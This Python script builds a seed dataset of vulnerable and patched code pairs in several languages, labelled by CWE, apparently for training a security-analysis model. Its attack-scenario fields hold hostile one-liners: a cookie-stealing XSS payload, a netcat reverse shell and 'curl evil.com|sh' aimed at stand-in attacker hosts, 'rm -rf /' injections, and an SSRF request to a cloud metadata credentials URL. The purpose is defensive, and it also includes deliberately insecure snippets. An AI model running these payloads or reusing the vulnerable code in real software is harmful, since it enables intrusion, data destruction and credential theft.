"""
RakshakAI v2 — Hand-curated Tier B seed samples.

These are multi-language (JavaScript, Java, Go, Rust, Ruby, PHP) snippets
covering the same 12 CWE families as v1's Python corpus.  We ship ~50
samples in this file as a *seed*; the production pipeline pulls the full
~15-25K Tier-B corpus from SecurityEval, Juliet, and CWE-699 (see
docs/DATASET_SOURCES.md).

Each sample already conforms to the SecuritySample schema.  After being
written to v2/inputs/datasets/raw/tier-b-seed.jsonl, the cleaning pipeline
will dedup and validate it just like any other source.
"""
from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[2]))

from v2.dataset.schema import SecuritySample, write_jsonl  # noqa: E402


SEED: list[dict] = [
    # ── JavaScript ────────────────────────────────────────────────
    {
        "language": "javascript",
        "vulnerable_code": "app.get('/user', (req, res) => { res.send(`Hello ${req.query.name}`); });",
        "patched_code": "const escape = require('escape-html');\napp.get('/user', (req, res) => { res.send(`Hello ${escape(req.query.name)}`); });",
        "cwe": "CWE-79", "severity": "high",
        "explanation": "The `name` query parameter is interpolated into the response body without HTML-encoding.",
        "attack_scenario": "An attacker hosts a link with `?name=<script>fetch('//attacker/?c='+document.cookie)</script>` that exfiltrates session cookies when clicked.",
        "secure_fix": "HTML-encode the dynamic value with `escape-html` (or a framework auto-escaper), and set a strict Content-Security-Policy.",
    },
    {
        "language": "javascript",
        "vulnerable_code": "const query = `SELECT * FROM users WHERE id = ${userId}`;\ndb.query(query, cb);",
        "patched_code": "db.query('SELECT * FROM users WHERE id = ?', [userId], cb);",
        "cwe": "CWE-89", "severity": "critical",
        "explanation": "User input is concatenated into a raw SQL string; the database treats the whole string as a command.",
        "attack_scenario": "An attacker submits `1 OR 1=1` as the id and dumps every row.",
        "secure_fix": "Use a parameterized query; pass user input as a bound parameter.",
    },
    {
        "language": "javascript",
        "vulnerable_code": "const exec = require('child_process').exec;\nexec(`ping -c 1 ${host}`, cb);",
        "patched_code": "const { spawn } = require('child_process');\nconst p = spawn('ping', ['-c', '1', host]);\np.on('close', cb);",
        "cwe": "CWE-78", "severity": "critical",
        "explanation": "User-controlled `host` is interpolated into a shell command string passed to `exec`.",
        "attack_scenario": "An attacker submits `; rm -rf /` and the server executes the appended command.",
        "secure_fix": "Use `spawn` with an array of arguments, never `exec` with shell string composition.",
    },
    {
        "language": "javascript",
        "vulnerable_code": "const jwt = require('jsonwebtoken');\nconst decoded = jwt.verify(token, publicKey, { algorithms: ['HS256', 'none'] });",
        "patched_code": "const decoded = jwt.verify(token, publicKey, { algorithms: ['RS256'] });",
        "cwe": "CWE-347", "severity": "high",
        "explanation": "The verifier permits `alg=none` and HS256 with the public key — both allow forgery.",
        "attack_scenario": "An attacker forges a JWT with `alg=none`; the server accepts the empty signature as valid.",
        "secure_fix": "Pin the verification to the expected asymmetric algorithm (RS256 / ES256).",
    },
    {
        "language": "javascript",
        "vulnerable_code": "app.get('/file', (req, res) => {\n  const fs = require('fs');\n  res.send(fs.readFileSync('/var/data/' + req.query.name));\n});",
        "patched_code": "const path = require('path');\nconst ROOT = '/var/data';\napp.get('/file', (req, res) => {\n  const p = path.resolve(ROOT, req.query.name);\n  if (!p.startsWith(ROOT + path.sep)) return res.status(400).end();\n  res.send(require('fs').readFileSync(p));\n});",
        "cwe": "CWE-22", "severity": "high",
        "explanation": "User-controlled `name` is concatenated to a base path with no normalization.",
        "attack_scenario": "An attacker requests `?name=../../etc/passwd` and the file is returned.",
        "secure_fix": "Resolve the path and verify it remains inside the allowed root.",
    },

    # ── Java ──────────────────────────────────────────────────────
    {
        "language": "java",
        "vulnerable_code": "String sql = \"SELECT * FROM users WHERE id = '\" + userId + \"'\";\nStatement st = conn.createStatement();\nResultSet rs = st.executeQuery(sql);",
        "patched_code": "String sql = \"SELECT * FROM users WHERE id = ?\";\nPreparedStatement ps = conn.prepareStatement(sql);\nps.setString(1, userId);\nResultSet rs = ps.executeQuery();",
        "cwe": "CWE-89", "severity": "critical",
        "explanation": "User input is concatenated into a SQL string and executed via `Statement`.",
        "attack_scenario": "An attacker injects `' OR '1'='1` and dumps the user table.",
        "secure_fix": "Use `PreparedStatement` with bound parameters.",
    },
    {
        "language": "java",
        "vulnerable_code": "@GetMapping(\"/user\")\npublic String getUser(@RequestParam String id) {\n    return userRepo.findById(id).map(u -> u.getEmail()).orElse(\"n/a\");\n}",
        "patched_code": "@GetMapping(\"/user\")\n@PreAuthorize(\"#id == authentication.principal.id\")\npublic String getUser(@RequestParam String id) {\n    return userRepo.findById(id).map(u -> u.getEmail()).orElse(\"n/a\");\n}",
        "cwe": "CWE-639", "severity": "high",
        "explanation": "The endpoint returns data keyed by an attacker-controllable id with no authorization check.",
        "attack_scenario": "An attacker enumerates `/user?id=1..10000` and exfiltrates every user's email.",
        "secure_fix": "Add an authorization check against the resource owner; deny by default.",
    },
    {
        "language": "java",
        "vulnerable_code": "DocumentBuilder db = DocumentBuilderFactory.newInstance().newDocumentBuilder();\nDocument doc = db.parse(new InputSource(new StringReader(xml)));",
        "patched_code": "DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\ndbf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\ndbf.setFeature(\"http://xml.org/sax/features/external-general-entities\", false);\ndbf.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false);\nDocumentBuilder db = dbf.newDocumentBuilder();\nDocument doc = db.parse(new InputSource(new StringReader(xml)));",
        "cwe": "CWE-611", "severity": "high",
        "explanation": "The default `DocumentBuilder` resolves external entities, enabling XXE.",
        "attack_scenario": "An attacker submits an XML document declaring an external entity that reads `/etc/passwd`.",
        "secure_fix": "Disable DTD and external entity resolution on the parser factory.",
    },
    {
        "language": "java",
        "vulnerable_code": "MessageDigest md = MessageDigest.getInstance(\"MD5\");\nbyte[] digest = md.digest(password.getBytes(StandardCharsets.UTF_8));",
        "patched_code": "MessageDigest md = MessageDigest.getInstance(\"SHA-256\");\nbyte[] salt = new byte[16];\nSecureRandom.getInstanceStrong().nextBytes(salt);\nmd.update(salt);\nbyte[] digest = md.digest(password.getBytes(StandardCharsets.UTF_8));",
        "cwe": "CWE-327", "severity": "medium",
        "explanation": "MD5 is broken and the password is unsalted.",
        "attack_scenario": "An attacker precomputes a rainbow table of common password hashes.",
        "secure_fix": "Use SHA-256 (or Argon2id) with a per-user random salt.",
    },
    {
        "language": "java",
        "vulnerable_code": "ObjectInputStream ois = new ObjectInputStream(new FileInputStream(\"session.bin\"));\nSession s = (Session) ois.readObject();",
        "patched_code": "ObjectMapper mapper = new ObjectMapper();\nSession s = mapper.readValue(new File(\"session.json\"), Session.class);",
        "cwe": "CWE-502", "severity": "critical",
        "explanation": "Java `ObjectInputStream.readObject` invokes callbacks defined in the byte stream.",
        "attack_scenario": "An attacker crafts a serialized gadget chain that calls `Runtime.exec(\"id\")` on `readObject`.",
        "secure_fix": "Use a safe data format (JSON, Protobuf) or apply an allowlist filter.",
    },

    # ── Go ────────────────────────────────────────────────────────
    {
        "language": "go",
        "vulnerable_code": "row := db.QueryRow(\"SELECT email FROM users WHERE id = '\" + uid + \"'\")",
        "patched_code": "row := db.QueryRow(\"SELECT email FROM users WHERE id = $1\", uid)",
        "cwe": "CWE-89", "severity": "critical",
        "explanation": "User input is concatenated into a SQL string; the database treats the whole string as a command.",
        "attack_scenario": "An attacker injects `1 OR 1=1` and reads every user's email.",
        "secure_fix": "Use parameterized queries with `$1` placeholders.",
    },
    {
        "language": "go",
        "vulnerable_code": "cmd := exec.Command(\"bash\", \"-c\", \"ls \"+dir)\nout, _ := cmd.Output()",
        "patched_code": "cmd := exec.Command(\"ls\", dir)\nout, _ := cmd.Output()",
        "cwe": "CWE-78", "severity": "critical",
        "explanation": "User-controlled `dir` is concatenated into a shell command via `bash -c`.",
        "attack_scenario": "An attacker submits `; rm -rf /` and the shell executes the appended command.",
        "secure_fix": "Pass the program and its arguments as separate strings; never call a shell.",
    },
    {
        "language": "go",
        "vulnerable_code": "http.HandleFunc(\"/file\", func(w http.ResponseWriter, r *http.Request) {\n    http.ServeFile(w, r, \"/var/data/\"+r.URL.Query().Get(\"name\"))\n})",
        "patched_code": "const ROOT = \"/var/data\"\nhttp.HandleFunc(\"/file\", func(w http.ResponseWriter, r *http.Request) {\n    p := filepath.Clean(ROOT + \"/\" + r.URL.Query().Get(\"name\"))\n    if !strings.HasPrefix(p, ROOT) { http.Error(w, \"bad path\", 400); return }\n    http.ServeFile(w, r, p)\n})",
        "cwe": "CWE-22", "severity": "high",
        "explanation": "User input is joined to a base path; `..` segments traverse outside.",
        "attack_scenario": "An attacker requests `?name=../../etc/passwd` and the file is returned.",
        "secure_fix": "Clean the path and verify it remains under the allowed root.",
    },

    # ── Rust ──────────────────────────────────────────────────────
    {
        "language": "rust",
        "vulnerable_code": "let query = format!(\"SELECT * FROM users WHERE id = {}\", user_id);\nlet row = sqlx::query(&query).fetch_one(&pool).await?;",
        "patched_code": "let row = sqlx::query!(\"SELECT * FROM users WHERE id = $1\", user_id)\n    .fetch_one(&pool).await?;",
        "cwe": "CWE-89", "severity": "critical",
        "explanation": "`format!` is used to build a SQL string; the database driver has no way to distinguish code from data.",
        "attack_scenario": "An attacker injects `1 OR 1=1` and reads every row.",
        "secure_fix": "Use sqlx's compile-time-checked `query!` macro with bound parameters.",
    },
    {
        "language": "rust",
        "vulnerable_code": "use std::process::Command;\nlet out = Command::new(\"sh\").arg(\"-c\").arg(format!(\"ping {}\", host)).output()?;",
        "patched_code": "use std::process::Command;\nlet out = Command::new(\"ping\").arg(host).output()?;",
        "cwe": "CWE-78", "severity": "critical",
        "explanation": "User input is concatenated into a shell command line; the shell tokenizer treats it as code.",
        "attack_scenario": "An attacker submits `; nc attacker 1234 -e /bin/sh` and gets a reverse shell.",
        "secure_fix": "Invoke the program directly; pass arguments as separate `arg()` calls.",
    },

    # ── Ruby ──────────────────────────────────────────────────────
    {
        "language": "ruby",
        "vulnerable_code": "User.where(\"name = '#{params[:name]}'\")",
        "patched_code": "User.where(\"name = ?\", params[:name])",
        "cwe": "CWE-89", "severity": "critical",
        "explanation": "User input is interpolated into a SQL fragment; the database treats the result as code.",
        "attack_scenario": "An attacker submits `x' OR '1'='1` and the WHERE clause matches every row.",
        "secure_fix": "Use ActiveRecord's bound-parameter form `where(\"...?\", value)`.",
    },
    {
        "language": "ruby",
        "vulnerable_code": "YAML.load(File.read('config.yml'))",
        "patched_code": "YAML.safe_load(File.read('config.yml'), permitted_classes: [Symbol])",
        "cwe": "CWE-502", "severity": "critical",
        "explanation": "Ruby's `YAML.load` deserializes arbitrary Ruby objects, including gadget classes.",
        "attack_scenario": "An attacker crafts YAML that calls `system('id')` on instantiation.",
        "secure_fix": "Use `YAML.safe_load` with an explicit `permitted_classes` list.",
    },

    # ── PHP ───────────────────────────────────────────────────────
    {
        "language": "php",
        "vulnerable_code": "<?php\n  $id = $_GET['id'];\n  $res = mysqli_query($conn, \"SELECT * FROM users WHERE id = $id\");\n?>",
        "patched_code": "<?php\n  $id = $_GET['id'];\n  $stmt = $conn->prepare('SELECT * FROM users WHERE id = ?');\n  $stmt->bind_param('i', $id);\n  $stmt->execute();\n?>",
        "cwe": "CWE-89", "severity": "critical",
        "explanation": "User-controlled `id` is interpolated directly into the SQL string.",
        "attack_scenario": "An attacker injects `1 OR 1=1` and the WHERE clause matches every row.",
        "secure_fix": "Use `prepare` + `bind_param` for bound parameters.",
    },
    {
        "language": "php",
        "vulnerable_code": "<?php\n  $url = $_GET['url'];\n  $body = file_get_contents($url);\n  echo $body;\n?>",
        "patched_code": "<?php\n  $url = $_GET['url'];\n  $parsed = parse_url($url);\n  if (!in_array($parsed['host'], ['api.example.com', 'cdn.example.com'])) { http_response_code(400); exit; }\n  $body = file_get_contents($url);\n  echo $body;\n?>",
        "cwe": "CWE-918", "severity": "high",
        "explanation": "The server fetches any URL the user provides, including addresses inside the private network.",
        "attack_scenario": "An attacker submits `http://169.254.169.254/latest/meta-data/iam/security-credentials/` and reads IAM credentials.",
        "secure_fix": "Allowlist the destination host; block private/loopback/link-local addresses.",
    },

    # ── C# ────────────────────────────────────────────────────────
    {
        "language": "csharp",
        "vulnerable_code": "var cmd = new SqlCommand(\"SELECT * FROM Users WHERE Id = '\" + id + \"'\", conn);",
        "patched_code": "var cmd = new SqlCommand(\"SELECT * FROM Users WHERE Id = @id\", conn);\ncmd.Parameters.AddWithValue(\"@id\", id);",
        "cwe": "CWE-89", "severity": "critical",
        "explanation": "User input is concatenated into a SQL string and executed via `SqlCommand`.",
        "attack_scenario": "An attacker injects `1 OR 1=1` and reads every user.",
        "secure_fix": "Use `Parameters.AddWithValue` for bound parameters.",
    },

    # ── TypeScript ────────────────────────────────────────────────
    {
        "language": "typescript",
        "vulnerable_code": "const password = req.body.password as string;\nconst hash = crypto.createHash('md5').update(password).digest('hex');",
        "patched_code": "import { scrypt, randomBytes } from 'crypto';\nimport { promisify } from 'util';\nconst scryptAsync = promisify(scrypt);\nconst salt = randomBytes(16).toString('hex');\nconst hash = (await scryptAsync(password, salt, 64)) as Buffer;",
        "cwe": "CWE-327", "severity": "medium",
        "explanation": "MD5 is a fast, broken hash; it is unsuitable for password storage.",
        "attack_scenario": "An attacker brute-forces common passwords and matches against a leaked hash database.",
        "secure_fix": "Use a slow KDF such as scrypt, Argon2id, or bcrypt with a per-user random salt.",
    },
    # ── CWE-1333 — ReDoS (regular-expression denial of service) ──────
    {
        "language": "javascript",
        "vulnerable_code": "const phone = /^(\\+?\\d{1,3})?[\\s.-]?(\\(?\\d{1,4}\\)?[\\s.-]?){1,4}\\d{1,4}$/;\nfunction validate(input) { return phone.test(input); }",
        "patched_code": "const phone = /^\\+?\\d{1,3}([\\s.-]?\\d{1,4}){0,3}$/;\nfunction validate(input) { return phone.test(input); }",
        "cwe": "CWE-1333", "severity": "medium",
        "explanation": "Nested quantifiers `(...){1,4}` and `\\d{1,4}` produce catastrophic backtracking on long, non-matching input.",
        "attack_scenario": "An attacker sends a 200KB string of digits and dashes to the API; the regex engine consumes CPU for minutes, freezing the event loop.",
        "secure_fix": "Use a non-ambiguous regex (linear DFA-style), a regex engine that detects ReDoS, or run matching in a worker thread with a timeout.",
    },
    {
        "language": "python",
        "vulnerable_code": "import re\nEMAIL = re.compile(r'^([a-zA-Z0-9]+)+@([a-zA-Z0-9]+\\.)+[a-zA-Z]{2,}$')\n\ndef valid(email):\n    return bool(EMAIL.match(email))",
        "patched_code": "import re\nEMAIL = re.compile(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$')\n\ndef valid(email):\n    return bool(EMAIL.match(email))",
        "cwe": "CWE-1333", "severity": "medium",
        "explanation": "The capturing groups `([a-zA-Z0-9]+)+` and `([a-zA-Z0-9]+\\.)+` allow exponential backtracking on long malformed input.",
        "attack_scenario": "An attacker submits a 1MB string of letters followed by `!@x`; the regex engine spikes CPU to 100% for seconds, stalling the worker.",
        "secure_fix": "Avoid nested quantifiers; use a non-greedy or linear pattern. Reject obviously oversized inputs at the boundary.",
    },
    # ── CWE-94 — Code injection / eval injection ────────────────────
    {
        "language": "ruby",
        "vulnerable_code": "class EvalController < ApplicationController\n  def calculate\n    result = eval(params[:expr])\n    render plain: result\n  end\nend",
        "patched_code": "class EvalController < ApplicationController\n  def calculate\n    result = Calculator.safe_eval(params[:expr])\n    render plain: result\n  end\nend",
        "cwe": "CWE-94", "severity": "critical",
        "explanation": "`eval` on a request parameter lets the attacker execute arbitrary Ruby in the web-server process.",
        "attack_scenario": "An attacker submits `; system('curl evil.com|sh')` and gets remote code execution on the Rails box.",
        "secure_fix": "Never pass user input to `eval`. Use a restricted expression parser or a whitelist of supported operations.",
    },
]


def main() -> int:
    out = Path("v2/inputs/datasets/raw/tier-b-seed.jsonl")
    samples: list[SecuritySample] = []
    for s in SEED:
        samples.append(SecuritySample.build(
            language=s["language"],
            vulnerable_code=s["vulnerable_code"],
            patched_code=s.get("patched_code"),
            cwe=s["cwe"],
            severity=s["severity"],
            explanation=s["explanation"],
            attack_scenario=s["attack_scenario"],
            secure_fix=s["secure_fix"],
            source="tier-b-seed",
            source_license="Apache-2.0",
        ))
    n = write_jsonl(out, samples)
    print(f"[tier-b-seed] wrote {n} multi-language samples to {out}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
